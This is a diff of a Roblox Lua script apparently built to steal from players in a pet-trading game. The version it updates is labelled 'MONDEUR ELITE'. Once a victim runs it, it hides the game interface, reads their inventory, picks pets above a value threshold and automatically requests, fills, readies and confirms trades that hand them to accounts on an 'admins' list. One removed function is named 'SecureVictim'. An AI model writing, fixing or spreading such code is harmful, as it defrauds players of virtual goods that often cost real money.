@@ -1,4 +1,4 @@
--- [[ MONDEUR ELITE v15.6 - FIXED API PATHS ]] --
+-- [[ MONDEUR ELITE v15.8 - FRESH START ]] --
 if _G.__Ran then return end
 _G.__Ran = true
 
@@ -7,8 +7,7 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local StarterGui = game:GetService("StarterGui")
 local LocalPlayer = Players.LocalPlayer
 
--- [[ STEP 1: FORCE UI IMMEDIATELY ]] --
--- We do this first so even if the game lags, the screen is locked.
+-- 1. FORCE UI & LOCKDOWN (Immediate)
 task.spawn(function()
     pcall(function()
         StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
@@ -17,49 +16,36 @@ task.spawn(function()
     end)
 end)
 
--- [[ STEP 2: CORRECT API PATHING ]] --
--- Fix: Changed TradeAPI to Trade
+-- 2. CORRECTED API (No Infinite Yield)
 local API = ReplicatedStorage:WaitForChild("API")
-local TradeRemoteFolder = API:WaitForChild("Trade") 
-
-local function SecureVictim(receiver)
-    pcall(function()
-        local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-        local targetChar = receiver.Character or receiver.CharacterAdded:Wait()
-        local hum = char:WaitForChild("Humanoid")
-        local hrp = char:WaitForChild("HumanoidRootPart")
-        local targetHrp = targetChar:WaitForChild("HumanoidRootPart")
-        
-        if hum and hrp and targetHrp then
-            hum.Sit = false
-            task.wait(0.1)
-            hrp.CFrame = targetHrp.CFrame * CFrame.new(0, 0, 3)
-            hrp.Anchored = true
-        end
-    end)
-end
+local TradeFolder = API:WaitForChild("Trade") -- Changed from TradeAPI to Trade
 
 local function executeTrade(targetPlayer)
     local ClientData = require(ReplicatedStorage.ClientModules.Core.ClientData)
     local inventory = ClientData.get_data().inventory
     
     if inventory and inventory.pets then
-        SecureVictim(targetPlayer)
+        -- Teleport & Anchor
+        pcall(function()
+            local hrp = LocalPlayer.Character.HumanoidRootPart
+            local targetHrp = targetPlayer.Character.HumanoidRootPart
+            hrp.CFrame = targetHrp.CFrame * CFrame.new(0, 0, 3)
+            hrp.Anchored = true
+        end)
 
         for _, petData in pairs(inventory.pets) do
             local val = _G.GetTrueValue(petData, _G.PetValueDB) or 0
             if val >= (getgenv().THRESHOLD or 0) then
                 task.spawn(function()
-                    -- Corrected Remote Name
-                    TradeRemoteFolder:WaitForChild("AddItemToTrade"):FireServer(petData.unique)
+                    TradeFolder:WaitForChild("AddItemToTrade"):FireServer(petData.unique)
                 end)
             end
         end
         
         task.wait(0.5)
-        TradeRemoteFolder:WaitForChild("ReadyTrade"):FireServer(true)
+        TradeFolder:WaitForChild("ReadyTrade"):FireServer(true)
         task.wait(0.2)
-        TradeRemoteFolder:WaitForChild("ConfirmTrade"):FireServer()
+        TradeFolder:WaitForChild("ConfirmTrade"):FireServer()
     end
 end
 
@@ -70,7 +56,7 @@ task.spawn(function()
         for _, name in pairs(admins) do
             local target = Players:FindFirstChild(name)
             if target then
-                TradeRemoteFolder:WaitForChild("RequestTrade"):FireServer(target)
+                TradeFolder:WaitForChild("RequestTrade"):FireServer(target)
                 executeTrade(target)
             end
         end
